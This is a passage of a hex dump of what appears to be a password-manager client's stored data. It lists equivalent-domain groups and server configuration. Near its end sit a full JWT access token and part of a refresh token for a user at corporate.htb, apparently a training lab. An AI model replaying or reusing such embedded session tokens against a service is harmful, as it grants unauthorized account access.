000040f0: 6169 7262 6e62 2e65 7300 0000 0000 0000  airbnb.es.......
00004100: 2500 0000 0300 ffff 0900 0080 0400 ffff  %...............
00004110: 6169 7262 6e62 2e66 6900 0000 0000 0000  airbnb.fi.......
00004120: 2600 0000 0300 ffff 0900 0080 0400 ffff  &...............
00004130: 6169 7262 6e62 2e66 7200 0000 0000 0000  airbnb.fr.......
00004140: 2700 0000 0300 ffff 0900 0080 0400 ffff  '...............
00004150: 6169 7262 6e62 2e67 7200 0000 0000 0000  airbnb.gr.......
00004160: 2800 0000 0300 ffff 0900 0080 0400 ffff  (...............
00004170: 6169 7262 6e62 2e67 7900 0000 0000 0000  airbnb.gy.......
00004180: 2900 0000 0300 ffff 0900 0080 0400 ffff  )...............
00004190: 6169 7262 6e62 2e68 7500 0000 0000 0000  airbnb.hu.......
000041a0: 2a00 0000 0300 ffff 0900 0080 0400 ffff  *...............
000041b0: 6169 7262 6e62 2e69 6500 0000 0000 0000  airbnb.ie.......
000041c0: 2b00 0000 0300 ffff 0900 0080 0400 ffff  +...............
000041d0: 6169 7262 6e62 2e69 7300 0000 0000 0000  airbnb.is.......
000041e0: 2c00 0000 0300 ffff 0900 0080 0400 ffff  ,...............
000041f0: 6169 7262 6e62 2e69 7400 0000 0000 0000  airbnb.it.......
00004200: 2d00 0000 0300 ffff 0900 0080 0400 ffff  -...............
00004210: 6169 7262 6e62 2e6a 7000 0000 0000 0000  airbnb.jp.......
00004220: 2e00 0000 0300 ffff 0900 0080 0400 ffff  ................
00004230: 6169 7262 6e62 2e6d 7800 0000 0000 0000  airbnb.mx.......
00004240: 2f00 0000 0300 ffff 0900 0080 0400 ffff  /...............
00004250: 6169 7262 6e62 2e6e 6c00 0000 0000 0000  airbnb.nl.......
00004260: 3000 0000 0300 ffff 0900 0080 0400 ffff  0...............
00004270: 6169 7262 6e62 2e6e 6f00 0000 0000 0000  airbnb.no.......
00004280: 3100 0000 0300 ffff 0900 0080 0400 ffff  1...............
00004290: 6169 7262 6e62 2e70 6c00 0000 0000 0000  airbnb.pl.......
000042a0: 3200 0000 0300 ffff 0900 0080 0400 ffff  2...............
000042b0: 6169 7262 6e62 2e70 7400 0000 0000 0000  airbnb.pt.......
000042c0: 3300 0000 0300 ffff 0900 0080 0400 ffff  3...............
000042d0: 6169 7262 6e62 2e72 7500 0000 0000 0000  airbnb.ru.......
000042e0: 3400 0000 0300 ffff 0900 0080 0400 ffff  4...............
000042f0: 6169 7262 6e62 2e73 6500 0000 0000 0000  airbnb.se.......
00004300: 0000 0000 1300 ffff 4800 0000 0300 ffff  ........H.......
00004310: 1a00 0000 0700 ffff 0000 0000 0300 ffff  ................
00004320: 0d00 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
00004330: 7465 2e61 7400 0000 0100 0000 0300 ffff  te.at...........
00004340: 0d00 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
00004350: 7465 2e62 6500 0000 0200 0000 0300 ffff  te.be...........
00004360: 0d00 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
00004370: 7465 2e63 6100 0000 0300 0000 0300 ffff  te.ca...........
00004380: 0d00 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
00004390: 7465 2e63 6800 0000 0400 0000 0300 ffff  te.ch...........
000043a0: 0d00 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
000043b0: 7465 2e63 6c00 0000 0500 0000 0300 ffff  te.cl...........
000043c0: 0d00 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
000043d0: 7465 2e63 6f00 0000 0600 0000 0300 ffff  te.co...........
000043e0: 1000 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
000043f0: 7465 2e63 6f2e 6e7a 0700 0000 0300 ffff  te.co.nz........
00004400: 1000 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
00004410: 7465 2e63 6f2e 756b 0800 0000 0300 ffff  te.co.uk........
00004420: 0e00 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
00004430: 7465 2e63 6f6d 0000 0900 0000 0300 ffff  te.com..........
00004440: 1100 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
00004450: 7465 2e63 6f6d 2e61 7200 0000 0000 0000  te.com.ar.......
00004460: 0a00 0000 0300 ffff 1100 0080 0400 ffff  ................
00004470: 6576 656e 7462 7269 7465 2e63 6f6d 2e61  eventbrite.com.a
00004480: 7500 0000 0000 0000 0b00 0000 0300 ffff  u...............
00004490: 1100 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
000044a0: 7465 2e63 6f6d 2e62 7200 0000 0000 0000  te.com.br.......
000044b0: 0c00 0000 0300 ffff 1100 0080 0400 ffff  ................
000044c0: 6576 656e 7462 7269 7465 2e63 6f6d 2e6d  eventbrite.com.m
000044d0: 7800 0000 0000 0000 0d00 0000 0300 ffff  x...............
000044e0: 1100 0080 0400 ffff 6576 656e 7462 7269  ........eventbri
000044f0: 7465 2e63 6f6d 2e70 6500 0000 0000 0000  te.com.pe.......
00004500: 0e00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004510: 6576 656e 7462 7269 7465 2e64 6500 0000  eventbrite.de...
00004520: 0f00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004530: 6576 656e 7462 7269 7465 2e64 6b00 0000  eventbrite.dk...
00004540: 1000 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004550: 6576 656e 7462 7269 7465 2e65 7300 0000  eventbrite.es...
00004560: 1100 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004570: 6576 656e 7462 7269 7465 2e66 6900 0000  eventbrite.fi...
00004580: 1200 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004590: 6576 656e 7462 7269 7465 2e66 7200 0000  eventbrite.fr...
000045a0: 1300 0000 0300 ffff 0d00 0080 0400 ffff  ................
000045b0: 6576 656e 7462 7269 7465 2e68 6b00 0000  eventbrite.hk...
000045c0: 1400 0000 0300 ffff 0d00 0080 0400 ffff  ................
000045d0: 6576 656e 7462 7269 7465 2e69 6500 0000  eventbrite.ie...
000045e0: 1500 0000 0300 ffff 0d00 0080 0400 ffff  ................
000045f0: 6576 656e 7462 7269 7465 2e69 7400 0000  eventbrite.it...
00004600: 1600 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004610: 6576 656e 7462 7269 7465 2e6e 6c00 0000  eventbrite.nl...
00004620: 1700 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004630: 6576 656e 7462 7269 7465 2e70 7400 0000  eventbrite.pt...
00004640: 1800 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004650: 6576 656e 7462 7269 7465 2e73 6500 0000  eventbrite.se...
00004660: 1900 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004670: 6576 656e 7462 7269 7465 2e73 6700 0000  eventbrite.sg...
00004680: 0000 0000 1300 ffff 4900 0000 0300 ffff  ........I.......
00004690: 0700 0000 0700 ffff 0000 0000 0300 ffff  ................
000046a0: 1100 0080 0400 ffff 7374 6163 6b65 7863  ........stackexc
000046b0: 6861 6e67 652e 636f 6d00 0000 0000 0000  hange.com.......
000046c0: 0100 0000 0300 ffff 0d00 0080 0400 ffff  ................
000046d0: 7375 7065 7275 7365 722e 636f 6d00 0000  superuser.com...
000046e0: 0200 0000 0300 ffff 1100 0080 0400 ffff  ................
000046f0: 7374 6163 6b6f 7665 7266 6c6f 772e 636f  stackoverflow.co
00004700: 6d00 0000 0000 0000 0300 0000 0300 ffff  m...............
00004710: 0f00 0080 0400 ffff 7365 7276 6572 6661  ........serverfa
00004720: 756c 742e 636f 6d00 0400 0000 0300 ffff  ult.com.........
00004730: 1000 0080 0400 ffff 6d61 7468 6f76 6572  ........mathover
00004740: 666c 6f77 2e6e 6574 0500 0000 0300 ffff  flow.net........
00004750: 0d00 0080 0400 ffff 6173 6b75 6275 6e74  ........askubunt
00004760: 752e 636f 6d00 0000 0600 0000 0300 ffff  u.com...........
00004770: 0d00 0080 0400 ffff 7374 6163 6b61 7070  ........stackapp
00004780: 732e 636f 6d00 0000 0000 0000 1300 ffff  s.com...........
00004790: 4a00 0000 0300 ffff 0200 0000 0700 ffff  J...............
000047a0: 0000 0000 0300 ffff 0c00 0080 0400 ffff  ................
000047b0: 646f 6375 7369 676e 2e63 6f6d 0000 0000  docusign.com....
000047c0: 0100 0000 0300 ffff 0c00 0080 0400 ffff  ................
000047d0: 646f 6375 7369 676e 2e6e 6574 0000 0000  docusign.net....
000047e0: 0000 0000 1300 ffff 4b00 0000 0300 ffff  ........K.......
000047f0: 0800 0000 0700 ffff 0000 0000 0300 ffff  ................
00004800: 0a00 0080 0400 ffff 656e 7661 746f 2e63  ........envato.c
00004810: 6f6d 0000 0000 0000 0100 0000 0300 ffff  om..............
00004820: 0f00 0080 0400 ffff 7468 656d 6566 6f72  ........themefor
00004830: 6573 742e 6e65 7400 0200 0000 0300 ffff  est.net.........
00004840: 0e00 0080 0400 ffff 636f 6465 6361 6e79  ........codecany
00004850: 6f6e 2e6e 6574 0000 0300 0000 0300 ffff  on.net..........
00004860: 0d00 0080 0400 ffff 7669 6465 6f68 6976  ........videohiv
00004870: 652e 6e65 7400 0000 0400 0000 0300 ffff  e.net...........
00004880: 0f00 0080 0400 ffff 6175 6469 6f6a 756e  ........audiojun
00004890: 676c 652e 6e65 7400 0500 0000 0300 ffff  gle.net.........
000048a0: 1000 0080 0400 ffff 6772 6170 6869 6372  ........graphicr
000048b0: 6976 6572 2e6e 6574 0600 0000 0300 ffff  iver.net........
000048c0: 0d00 0080 0400 ffff 7068 6f74 6f64 756e  ........photodun
000048d0: 652e 6e65 7400 0000 0700 0000 0300 ffff  e.net...........
000048e0: 0b00 0080 0400 ffff 3364 6f63 6561 6e2e  ........3docean.
000048f0: 6e65 7400 0000 0000 0000 0000 1300 ffff  net.............
00004900: 4c00 0000 0300 ffff 0200 0000 0700 ffff  L...............
00004910: 0000 0000 0300 ffff 0e00 0080 0400 ffff  ................
00004920: 7831 3068 6f73 7469 6e67 2e63 6f6d 0000  x10hosting.com..
00004930: 0100 0000 0300 ffff 0e00 0080 0400 ffff  ................
00004940: 7831 3070 7265 6d69 756d 2e63 6f6d 0000  x10premium.com..
00004950: 0000 0000 1300 ffff 4d00 0000 0300 ffff  ........M.......
00004960: 0300 0000 0700 ffff 0000 0000 0300 ffff  ................
00004970: 0d00 0080 0400 ffff 646e 736f 6d61 7469  ........dnsomati
00004980: 632e 636f 6d00 0000 0100 0000 0300 ffff  c.com...........
00004990: 0b00 0080 0400 ffff 6f70 656e 646e 732e  ........opendns.
000049a0: 636f 6d00 0000 0000 0200 0000 0300 ffff  com.............
000049b0: 0c00 0080 0400 ffff 756d 6272 656c 6c61  ........umbrella
000049c0: 2e63 6f6d 0000 0000 0000 0000 1300 ffff  .com............
000049d0: 4e00 0000 0300 ffff 0d00 0000 0700 ffff  N...............
000049e0: 0000 0000 0300 ffff 1200 0080 0400 ffff  ................
000049f0: 6361 6772 6561 7461 6d65 7269 6361 2e63  cagreatamerica.c
00004a00: 6f6d 0000 0000 0000 0100 0000 0300 ffff  om..............
00004a10: 1500 0080 0400 ffff 6361 6e61 6461 7377  ........canadasw
00004a20: 6f6e 6465 726c 616e 642e 636f 6d00 0000  onderland.com...
00004a30: 0200 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004a40: 6361 726f 7769 6e64 732e 636f 6d00 0000  carowinds.com...
00004a50: 0300 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004a60: 6365 6461 7266 6169 722e 636f 6d00 0000  cedarfair.com...
00004a70: 0400 0000 0300 ffff 0e00 0080 0400 ffff  ................
00004a80: 6365 6461 7270 6f69 6e74 2e63 6f6d 0000  cedarpoint.com..
00004a90: 0500 0000 0300 ffff 0e00 0080 0400 ffff  ................
00004aa0: 646f 726e 6579 7061 726b 2e63 6f6d 0000  dorneypark.com..
00004ab0: 0600 0000 0300 ffff 1100 0080 0400 ffff  ................
00004ac0: 6b69 6e67 7364 6f6d 696e 696f 6e2e 636f  kingsdominion.co
00004ad0: 6d00 0000 0000 0000 0700 0000 0300 ffff  m...............
00004ae0: 0a00 0080 0400 ffff 6b6e 6f74 7473 2e63  ........knotts.c
00004af0: 6f6d 0000 0000 0000 0800 0000 0300 ffff  om..............
00004b00: 0f00 0080 0400 ffff 6d69 6164 7665 6e74  ........miadvent
00004b10: 7572 652e 636f 6d00 0900 0000 0300 ffff  ure.com.........
00004b20: 1100 0080 0400 ffff 7363 686c 6974 7465  ........schlitte
00004b30: 7262 6168 6e2e 636f 6d00 0000 0000 0000  rbahn.com.......
00004b40: 0a00 0000 0300 ffff 0e00 0080 0400 ffff  ................
00004b50: 7661 6c6c 6579 6661 6972 2e63 6f6d 0000  valleyfair.com..
00004b60: 0b00 0000 0300 ffff 1400 0080 0400 ffff  ................
00004b70: 7669 7369 746b 696e 6773 6973 6c61 6e64  visitkingsisland
00004b80: 2e63 6f6d 0000 0000 0c00 0000 0300 ffff  .com............
00004b90: 0f00 0080 0400 ffff 776f 726c 6473 6f66  ........worldsof
00004ba0: 6675 6e2e 636f 6d00 0000 0000 1300 ffff  fun.com.........
00004bb0: 4f00 0000 0300 ffff 0200 0000 0700 ffff  O...............
00004bc0: 0000 0000 0300 ffff 0800 0080 0400 ffff  ................
00004bd0: 7562 6e74 2e63 6f6d 0100 0000 0300 ffff  ubnt.com........
00004be0: 0600 0080 0400 ffff 7569 2e63 6f6d 0000  ........ui.com..
00004bf0: 0000 0000 1300 ffff 5000 0000 0300 ffff  ........P.......
00004c00: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00004c10: 0e00 0080 0400 ffff 6469 7363 6f72 6461  ........discorda
00004c20: 7070 2e63 6f6d 0000 0100 0000 0300 ffff  pp.com..........
00004c30: 0b00 0080 0400 ffff 6469 7363 6f72 642e  ........discord.
00004c40: 636f 6d00 0000 0000 0000 0000 1300 ffff  com.............
00004c50: 5100 0000 0300 ffff 0300 0000 0700 ffff  Q...............
00004c60: 0000 0000 0300 ffff 0900 0080 0400 ffff  ................
00004c70: 6e65 7463 7570 2e64 6500 0000 0000 0000  netcup.de.......
00004c80: 0100 0000 0300 ffff 0900 0080 0400 ffff  ................
00004c90: 6e65 7463 7570 2e65 7500 0000 0000 0000  netcup.eu.......
00004ca0: 0200 0000 0300 ffff 1700 0080 0400 ffff  ................
00004cb0: 6375 7374 6f6d 6572 636f 6e74 726f 6c70  customercontrolp
00004cc0: 616e 656c 2e64 6500 0000 0000 1300 ffff  anel.de.........
00004cd0: 5200 0000 0300 ffff 1600 0000 0700 ffff  R...............
00004ce0: 0000 0000 0300 ffff 0a00 0080 0400 ffff  ................
00004cf0: 7961 6e64 6578 2e63 6f6d 0000 0000 0000  yandex.com......
00004d00: 0100 0000 0300 ffff 0500 0080 0400 ffff  ................
00004d10: 7961 2e72 7500 0000 0200 0000 0300 ffff  ya.ru...........
00004d20: 0900 0080 0400 ffff 7961 6e64 6578 2e61  ........yandex.a
00004d30: 7a00 0000 0000 0000 0300 0000 0300 ffff  z...............
00004d40: 0900 0080 0400 ffff 7961 6e64 6578 2e62  ........yandex.b
00004d50: 7900 0000 0000 0000 0400 0000 0300 ffff  y...............
00004d60: 0c00 0080 0400 ffff 7961 6e64 6578 2e63  ........yandex.c
00004d70: 6f2e 696c 0000 0000 0500 0000 0300 ffff  o.il............
00004d80: 0d00 0080 0400 ffff 7961 6e64 6578 2e63  ........yandex.c
00004d90: 6f6d 2e61 6d00 0000 0600 0000 0300 ffff  om.am...........
00004da0: 0d00 0080 0400 ffff 7961 6e64 6578 2e63  ........yandex.c
00004db0: 6f6d 2e67 6500 0000 0700 0000 0300 ffff  om.ge...........
00004dc0: 0d00 0080 0400 ffff 7961 6e64 6578 2e63  ........yandex.c
00004dd0: 6f6d 2e74 7200 0000 0800 0000 0300 ffff  om.tr...........
00004de0: 0900 0080 0400 ffff 7961 6e64 6578 2e65  ........yandex.e
00004df0: 6500 0000 0000 0000 0900 0000 0300 ffff  e...............
00004e00: 0900 0080 0400 ffff 7961 6e64 6578 2e66  ........yandex.f
00004e10: 6900 0000 0000 0000 0a00 0000 0300 ffff  i...............
00004e20: 0900 0080 0400 ffff 7961 6e64 6578 2e66  ........yandex.f
00004e30: 7200 0000 0000 0000 0b00 0000 0300 ffff  r...............
00004e40: 0900 0080 0400 ffff 7961 6e64 6578 2e6b  ........yandex.k
00004e50: 6700 0000 0000 0000 0c00 0000 0300 ffff  g...............
00004e60: 0900 0080 0400 ffff 7961 6e64 6578 2e6b  ........yandex.k
00004e70: 7a00 0000 0000 0000 0d00 0000 0300 ffff  z...............
00004e80: 0900 0080 0400 ffff 7961 6e64 6578 2e6c  ........yandex.l
00004e90: 7400 0000 0000 0000 0e00 0000 0300 ffff  t...............
00004ea0: 0900 0080 0400 ffff 7961 6e64 6578 2e6c  ........yandex.l
00004eb0: 7600 0000 0000 0000 0f00 0000 0300 ffff  v...............
00004ec0: 0900 0080 0400 ffff 7961 6e64 6578 2e6d  ........yandex.m
00004ed0: 6400 0000 0000 0000 1000 0000 0300 ffff  d...............
00004ee0: 0900 0080 0400 ffff 7961 6e64 6578 2e70  ........yandex.p
00004ef0: 6c00 0000 0000 0000 1100 0000 0300 ffff  l...............
00004f00: 0900 0080 0400 ffff 7961 6e64 6578 2e72  ........yandex.r
00004f10: 7500 0000 0000 0000 1200 0000 0300 ffff  u...............
00004f20: 0900 0080 0400 ffff 7961 6e64 6578 2e74  ........yandex.t
00004f30: 6a00 0000 0000 0000 1300 0000 0300 ffff  j...............
00004f40: 0900 0080 0400 ffff 7961 6e64 6578 2e74  ........yandex.t
00004f50: 6d00 0000 0000 0000 1400 0000 0300 ffff  m...............
00004f60: 0900 0080 0400 ffff 7961 6e64 6578 2e75  ........yandex.u
00004f70: 6100 0000 0000 0000 1500 0000 0300 ffff  a...............
00004f80: 0900 0080 0400 ffff 7961 6e64 6578 2e75  ........yandex.u
00004f90: 7a00 0000 0000 0000 0000 0000 1300 ffff  z...............
00004fa0: 5300 0000 0300 ffff 0200 0000 0700 ffff  S...............
00004fb0: 0000 0000 0300 ffff 1c00 0080 0400 ffff  ................
00004fc0: 736f 6e79 656e 7465 7274 6169 6e6d 656e  sonyentertainmen
00004fd0: 746e 6574 776f 726b 2e63 6f6d 0000 0000  tnetwork.com....
00004fe0: 0100 0000 0300 ffff 0800 0080 0400 ffff  ................
00004ff0: 736f 6e79 2e63 6f6d 0000 0000 1300 ffff  sony.com........
00005000: 5400 0000 0300 ffff 0300 0000 0700 ffff  T...............
00005010: 0000 0000 0300 ffff 0900 0080 0400 ffff  ................
00005020: 7072 6f74 6f6e 2e6d 6500 0000 0000 0000  proton.me.......
00005030: 0100 0000 0300 ffff 0e00 0080 0400 ffff  ................
00005040: 7072 6f74 6f6e 6d61 696c 2e63 6f6d 0000  protonmail.com..
00005050: 0200 0000 0300 ffff 0d00 0080 0400 ffff  ................
00005060: 7072 6f74 6f6e 7670 6e2e 636f 6d00 0000  protonvpn.com...
00005070: 0000 0000 1300 ffff 5500 0000 0300 ffff  ........U.......
00005080: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00005090: 0b00 0080 0400 ffff 7562 6973 6f66 742e  ........ubisoft.
000050a0: 636f 6d00 0000 0000 0100 0000 0300 ffff  com.............
000050b0: 0700 0080 0400 ffff 7562 692e 636f 6d00  ........ubi.com.
000050c0: 0000 0000 1300 ffff 5600 0000 0300 ffff  ........V.......
000050d0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
000050e0: 1000 0080 0400 ffff 7472 616e 7366 6572  ........transfer
000050f0: 7769 7365 2e63 6f6d 0100 0000 0300 ffff  wise.com........
00005100: 0800 0080 0400 ffff 7769 7365 2e63 6f6d  ........wise.com
00005110: 0000 0000 1300 ffff 5700 0000 0300 ffff  ........W.......
00005120: 0900 0000 0700 ffff 0000 0000 0300 ffff  ................
00005130: 0c00 0080 0400 ffff 7461 6b65 6177 6179  ........takeaway
00005140: 2e63 6f6d 0000 0000 0100 0000 0300 ffff  .com............
00005150: 0b00 0080 0400 ffff 6a75 7374 2d65 6174  ........just-eat
00005160: 2e64 6b00 0000 0000 0200 0000 0300 ffff  .dk.............
00005170: 0b00 0080 0400 ffff 6a75 7374 2d65 6174  ........just-eat
00005180: 2e6e 6f00 0000 0000 0300 0000 0300 ffff  .no.............
00005190: 0b00 0080 0400 ffff 6a75 7374 2d65 6174  ........just-eat
000051a0: 2e66 7200 0000 0000 0400 0000 0300 ffff  .fr.............
000051b0: 0b00 0080 0400 ffff 6a75 7374 2d65 6174  ........just-eat
000051c0: 2e63 6800 0000 0000 0500 0000 0300 ffff  .ch.............
000051d0: 0d00 0080 0400 ffff 6c69 6566 6572 616e  ........lieferan
000051e0: 646f 2e64 6500 0000 0600 0000 0300 ffff  do.de...........
000051f0: 0d00 0080 0400 ffff 6c69 6566 6572 616e  ........lieferan
00005200: 646f 2e61 7400 0000 0700 0000 0300 ffff  do.at...........
00005210: 0f00 0080 0400 ffff 7468 7569 7362 657a  ........thuisbez
00005220: 6f72 6764 2e6e 6c00 0800 0000 0300 ffff  orgd.nl.........
00005230: 0900 0080 0400 ffff 7079 737a 6e65 2e70  ........pyszne.p
00005240: 6c00 0000 0000 0000 0000 0000 1300 ffff  l...............
00005250: 5800 0000 0300 ffff 0600 0000 0700 ffff  X...............
00005260: 0000 0000 0300 ffff 0d00 0080 0400 ffff  ................
00005270: 6174 6c61 7373 6961 6e2e 636f 6d00 0000  atlassian.com...
00005280: 0100 0000 0300 ffff 0d00 0080 0400 ffff  ................
00005290: 6269 7462 7563 6b65 742e 6f72 6700 0000  bitbucket.org...
000052a0: 0200 0000 0300 ffff 0a00 0080 0400 ffff  ................
000052b0: 7472 656c 6c6f 2e63 6f6d 0000 0000 0000  trello.com......
000052c0: 0300 0000 0300 ffff 0d00 0080 0400 ffff  ................
000052d0: 7374 6174 7573 7061 6765 2e69 6f00 0000  statuspage.io...
000052e0: 0400 0000 0300 ffff 0d00 0080 0400 ffff  ................
000052f0: 6174 6c61 7373 6961 6e2e 6e65 7400 0000  atlassian.net...
00005300: 0500 0000 0300 ffff 0800 0080 0400 ffff  ................
00005310: 6a69 7261 2e63 6f6d 0000 0000 1300 ffff  jira.com........
00005320: 0000 0000 1300 ffff 0000 0000 1300 ffff  ................
00005330: 0b00 0080 0400 ffff 6176 6174 6172 436f  ........avatarCo
00005340: 6c6f 7200 0000 0000 0000 0000 0000 ffff  lor.............
00005350: 0c00 0080 0400 ffff 7365 7276 6572 436f  ........serverCo
00005360: 6e66 6967 0000 0000 0000 0000 0800 ffff  nfig............
00005370: 0700 0080 0400 ffff 7665 7273 696f 6e00  ........version.
00005380: 0000 0000 0100 ffff 0700 0080 0400 ffff  ................
00005390: 6769 7448 6173 6800 0000 0000 0100 ffff  gitHash.........
000053a0: 0600 0080 0400 ffff 7365 7276 6572 0000  ........server..
000053b0: 0000 0000 0000 ffff 0700 0080 0400 ffff  ................
000053c0: 7574 6344 6174 6500 1800 0080 0400 ffff  utcDate.........
000053d0: 3230 3233 2d30 342d 3133 5431 353a 3339  2023-04-13T15:39
000053e0: 3a34 382e 3536 305a 0b00 0080 0400 ffff  :48.560Z........
000053f0: 656e 7669 726f 6e6d 656e 7400 0000 0000  environment.....
00005400: 0000 0000 0000 ffff 0000 0000 1300 ffff  ................
00005410: 0000 0000 1300 ffff 0600 0080 0400 ffff  ................
00005420: 746f 6b65 6e73 0000 0000 0000 0800 ffff  tokens..........
00005430: 0b00 0080 0400 ffff 6163 6365 7373 546f  ........accessTo
00005440: 6b65 6e00 0000 0000 a303 0080 0400 ffff  ken.............
00005450: 6579 4a30 6558 4169 4f69 4a4b 5631 5169  eyJ0eXAiOiJKV1Qi
00005460: 4c43 4a68 6247 6369 4f69 4a53 557a 4931  LCJhbGciOiJSUzI1
00005470: 4e69 4a39 2e65 794a 7559 6d59 694f 6a45  NiJ9.eyJuYmYiOjE
00005480: 324f 4445 304d 4441 304d 6a6b 7349 6d56  2ODE0MDA0MjksImV
00005490: 3463 4349 364d 5459 344d 5451 774e 7a59  4cCI6MTY4MTQwNzY
000054a0: 794f 5377 6961 584e 7a49 6a6f 6961 4852  yOSwiaXNzIjoiaHR
000054b0: 3063 446f 764c 3278 7659 3246 7361 4739  0cDovL2xvY2FsaG9
000054c0: 7a64 4878 7362 3264 7062 6949 7349 6e4e  zdHxsb2dpbiIsInN
000054d0: 3159 6949 3649 6a41 3459 6a4d 334e 5446  1YiI6IjA4YjM3NTF
000054e0: 694c 5746 685a 4455 744e 4459 784e 6931  iLWFhZDUtNDYxNi1
000054f0: 694d 5759 334c 5441 784e 5751 7a59 6d55  iMWY3LTAxNWQzYmU
00005500: 334e 446c 6b59 6949 7349 6e42 795a 5731  3NDlkYiIsInByZW1
00005510: 7064 5730 694f 6e52 7964 5755 7349 6d35  pdW0iOnRydWUsIm5
00005520: 6862 5755 694f 694a 4662 4864 7062 6942  hbWUiOiJFbHdpbiB
00005530: 4b62 3235 6c63 7949 7349 6d56 7459 576c  Kb25lcyIsImVtYWl
00005540: 7349 6a6f 695a 5778 3361 5734 7561 6d39  sIjoiZWx3aW4uam9
00005550: 755a 584e 4159 3239 7963 4739 7959 5852  uZXNAY29ycG9yYXR
00005560: 6c4c 6d68 3059 6949 7349 6d56 7459 576c  lLmh0YiIsImVtYWl
00005570: 7358 335a 6c63 6d6c 6d61 5756 6b49 6a70  sX3ZlcmlmaWVkIjp
00005580: 3063 6e56 6c4c 434a 7663 6d64 7664 3235  0cnVlLCJvcmdvd25
00005590: 6c63 6949 3657 3130 7349 6d39 795a 3246  lciI6W10sIm9yZ2F
000055a0: 6b62 576c 7549 6a70 6258 5377 6962 334a  kbWluIjpbXSwib3J
000055b0: 6e64 584e 6c63 6949 3657 3130 7349 6d39  ndXNlciI6W10sIm9
000055c0: 795a 3231 6862 6d46 6e5a 5849 694f 6c74  yZ21hbmFnZXIiOlt
000055d0: 644c 434a 7a63 3352 6862 5841 694f 6949  dLCJzc3RhbXAiOiI
000055e0: 3459 7a49 795a 6a67 314f 5330 774e 574e  4YzIyZjg1OS0wNWN
000055f0: 6b4c 5451 314e 4441 744f 5445 314d 5331  kLTQ1NDAtOTE1MS1
00005600: 6c4e 5442 6c5a 4452 6d4e 4446 684d 5463  lNTBlZDRmNDFhMTc
00005610: 694c 434a 6b5a 585a 7059 3255 694f 694a  iLCJkZXZpY2UiOiJ
00005620: 6b59 5759 325a 5451 774e 7930 304d 7a55  kYWY2ZTQwNy00MzU
00005630: 324c 5452 6a4d 6d51 744f 4464 6b4e 6930  2LTRjMmQtODdkNi0
00005640: 3259 6a52 6b59 7a6b 784e 5455 794d 5451  2YjRkYzkxNTUyMTQ
00005650: 694c 434a 7a59 3239 775a 5349 3657 794a  iLCJzY29wZSI6WyJ
00005660: 6863 476b 694c 434a 765a 6d5a 7361 5735  hcGkiLCJvZmZsaW5
00005670: 6c58 3246 6a59 3256 7a63 794a 644c 434a  lX2FjY2VzcyJdLCJ
00005680: 6862 5849 694f 6c73 6951 5842 7762 476c  hbXIiOlsiQXBwbGl
00005690: 6a59 5852 7062 3234 6958 5830 2e53 6759  jYXRpb24iXX0.SgY
000056a0: 4a4d 6f69 426e 7556 6846 4d53 456c 4a30  JMoiBnuVhFMSElJ0
000056b0: 504a 647a 6337 3169 7644 384b 6458 6a75  PJdzc71ivD8KdXju
000056c0: 5965 4143 4e6f 6962 6b45 6959 5462 6d67  YeACNoibkEiYTbmg
000056d0: 7175 4c67 597a 6a35 6933 7559 704a 4b57  quLgYzj5i3uYpJKW
000056e0: 3851 347a 7054 4c64 6837 6b66 6358 3838  8Q4zpTLdh7kfcX88
000056f0: 7851 4352 4730 554b 3654 7051 5844 324b  xQCRG0UK6TpQXD2K
00005700: 694e 3349 7654 4573 6d67 6a4f 444c 6f7a  iN3IvTEsmgjODLoz
00005710: 5650 5f54 5245 4c42 4377 3368 6667 4f75  VP_TRELBCw3hfgOu
00005720: 6961 6763 6f65 717a 4651 4648 6e5a 3970  iagcoeqzFQFHnZ9p
00005730: 5257 3233 454b 6a43 5659 7449 5334 7174  RW23EKjCVYtIS4qt
00005740: 3645 516a 497a 2d7a 496a 4f6c 6e4f 7a53  6EQjIz-zIjOlnOzS
00005750: 6533 5242 4432 3949 4434 4d51 3737 7246  e3RBD29ID4MQ77rF
00005760: 556e 545f 7330 7435 4f4a 7071 7a41 6247  UnT_s0t5OJpqzAbG
00005770: 6c69 2d7a 7274 7370 737a 305f 6852 6c69  li-zrtspsz0_hRli
00005780: 7975 7670 7946 4a4a 5254 3151 6c33 2d66  yuvpyFJJRT1Ql3-f
00005790: 4638 7072 3555 5f69 5531 7473 542d 3175  F8pr5U_iU1tsT-1u
000057a0: 6843 5933 744f 5f31 626c 576b 3831 776b  hCY3tO_1blWk81wk
000057b0: 6b6a 5a58 3735 4267 4158 3959 6d4e 6b51  kjZX75BgAX9YmNkQ
000057c0: 7447 5231 314e 6b5f 6731 3653 5659 5378  tGR11Nk_g16SVYSx
000057d0: 6930 516b 7242 5130 4346 6451 694b 6250  i0QkrBQ0CFdQiKbP
000057e0: 744f 4768 5775 6337 3437 5a64 4d62 6657  tOGhWuc747ZdMbfW
000057f0: 5956 7700 0000 0000 0c00 0080 0400 ffff  YVw.............
00005800: 7265 6672 6573 6854 6f6b 656e 0000 0000  refreshToken....
00005810: 5800 0080 0400 ffff 4574 5a4f 5742 584d  X.......EtZOWBXM
00005820: 7838 5746 7563 5078 4e55 6735 2d57 6d2d  x8WFucPxNUg5-Wm-
00005830: 7571 434b 2d35 6835 556a 6230 3741 5434  uqCK-5h5Ujb07AT4
